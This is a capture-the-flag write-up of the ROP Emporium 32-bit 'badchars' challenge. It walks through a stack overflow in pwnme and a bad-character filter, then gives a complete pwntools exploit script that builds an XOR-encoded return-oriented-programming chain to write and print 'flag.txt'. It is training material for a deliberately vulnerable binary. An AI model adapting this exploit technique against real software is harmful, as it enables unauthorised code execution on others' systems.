# badchars - 32 Bit
Program execution:
```
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> <input_here>
```
Run checksec: `checksec ./badchars32`
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Again, `main` call `pwnme`, which is defined in the given libbadchars32.so.

Disassembling libbadchars32.so shows that `pwnme` unsafely reads too many (0x200) bytes in to a 32 byte buffer at `ebp-0x28`:
```assembly
push    0x200 {var_44}
lea     eax, [ebp-0x38]
add     eax {var_2c}, 0x10
push    eax {var_2c} {var_48}
push    0x0
call    read
```

We also find some code that checks our input for bad characters ('x'/0x78, 'g'/0x67, 'a'/0x61, '.'/0x2E). If any of these characters are found, they will be replaced with 0xeb which will invalidate our rop chain, making it incorrect.
```c
0000072a  puts("badchars are: 'x', 'g', 'a', '.'")
0000073c  printf(data_8bd)
00000755  int32_t eax_1 = read(0, &var_2c, 0x200)
000007b5  for (int32_t var_38 = 0; var_38 u< eax_1; var_38 = var_38 + 1)
000007a2      for (int32_t var_34_1 = 0; var_34_1 u<= 3; var_34_1 = var_34_1 + 1)
00000787          if (*(&var_2c + var_38) == *(badcharacters + var_34_1))
0000078e              *(&var_2c + var_38) = 0xeb
```

Like in the last challenge, there is a `print_file` function which will print a file specified by the string argument (filename string address). So we want to pass "flag.txt" into this function.
Running `rabin2 -z badchars32` reveals that there is no flag.txt string:
```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000005e0 0x080485e0 11  12   .rodata ascii nonexistent
```
Let's find a writeable area of memory, where we can write our "flag.txt" string.
`readelf -S badchars32`:
```
There are 30 section headers, starting at offset 0x17a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048298 000298 00008d 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048326 000326 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804833c 00033c 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             0804835c 00035c 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048364 000364 000018 08  AI  5  23  4
  [11] .init             PROGBITS        0804837c 00037c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 0001d2 00  AX  0   0 16
  [15] .fini             PROGBITS        080485c4 0005c4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485d8 0005d8 000014 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080485ec 0005ec 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048630 000630 000114 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000213 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00169f 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

So we know we need to write "flag.txt" to .data, but what ROP gadgets can we use to achieve that? We need to find `mov` gadgets that work with memory address (`[reg]` notation). We also bear in mind our bad bytes to filter out: ('x'/0x78, 'g'/0x67, 'a'/0x61, '.'/0x2E)
`ropper -f badchars32 --search 'mov [???], ???' -b 7867612E`:
```
[INFO] File: badchars32
0x0804854f: mov dword ptr [edi], esi; ret;
```
So we have 1 gadgets that lets us move the value in `esi` into the address specified by the value of `edi`. So now we need gadgets to pop data off the stack into `esi` and `edi`
`ropper -f badchars32 --search 'pop esi; pop edi;' -b 7867612E`:
```
[INFO] File: badchars32
0x080485b9: pop esi; pop edi; pop ebp; ret;
```
We have a gadget that will let us pop `esi` and `edi` as needed but also `ebp` which we can just load dummy data into.
Since we can only move 4 bytes at a time, we will have to do 3 moves. One for "flag", one for ".txt" and one for "\x00\x00\x00\x00" so that our string ends with a null terminator.
Each time we write 4 bytes, remember we need to offset the .data address to write to, by 4.

However we aren't done. We have to account for the fact that 'g', 'a' and '.' are bad bytes but they are required to represent the string "flag.txt". We'll need to encrypt this string in our exploit to bypass badchar checks, then we can decrypt it once it's already in memory.
An easy encryption technique is `xor`.
`ropper -f badchars32 --search 'xor' -b 7867612E`:
```
[INFO] File: badchars32
0x08048713: xor byte ptr [ebp + 0xe], cl; and byte ptr [edi + 0xe], al; adc al, 0x41; ret;
0x08048547: xor byte ptr [ebp], bl; ret;
0x080485cf: xor ebx, dword ptr [edx]; add byte ptr [eax], al; add esp, 8; pop ebx; ret;
```
Luckily for us, we have an `xor` gadget so this is actually a viable technique. Since the `xor` is done byte at a time (lowest byte of the 4-byte register, as we're deal with little endian), we'll need some gadgets to load target address into `ebp` and a gadget to load our bitmask (for `xor`) into `ebx`.
`ropper -f badchars32 --search 'pop ebp' -b 7867612E`:
```
[INFO] File: badchars32
0x08048525: pop ebp; lea esp, [ecx - 4]; ret;
0x080485bb: pop ebp; ret;
```
`ropper -f badchars32 --search 'pop ebx' -b 7867612E`
```
[INFO] File: badchars32
0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret;
0x0804839d: pop ebx; ret;
```

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./badchars32"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
  gdb.attach(p, '''break main''')

bad_bytes = b'xga.'
# ascii is 0-127, so we can just xor 128
bitmask = 1<<7

data_addr = 0x0804a018
mov_ptr_edi_addr = 0x0804854f # mov dword ptr [edi], esi; ret;
pop_esi_edi_ebp_addr = 0x080485b9 # pop esi; pop edi; pop ebp; ret;
xor_ptr_ebp_bl = 0x08048547 # xor byte ptr [ebp], bl; ret;
pop_ebp = 0x080485bb # pop ebp; ret;
pop_ebx = 0x0804839d # pop ebx; ret;
p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)

for i, string in enumerate([b'flag', b'.txt', b'\x00'*4]):
  # build our string, 4 bytes at a time

  payload += p32(pop_ebx)
  payload += p32(bitmask)
  payload += p32(pop_esi_edi_ebp_addr)

  # xor each byte to bypass badchars check
  for c in string:
    payload += p8(c ^ bitmask)

  payload += p32(data_addr + i*4)
  payload += b'AAAA'
  payload += p32(mov_ptr_edi_addr)

  for j in range(4):
    # in-memory data manipulation to undo xor
    payload += p32(pop_ebp)
    payload += p32(data_addr + i*4 + j)
    payload += p32(xor_ptr_ebp_bl)


# with our .data set up, we can call print_file
payload += p32(elf.symbols['print_file'])
payload += b'A' * 4
payload += p32(data_addr)

p.sendline(payload)

p.interactive()
```

And we get the flag:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```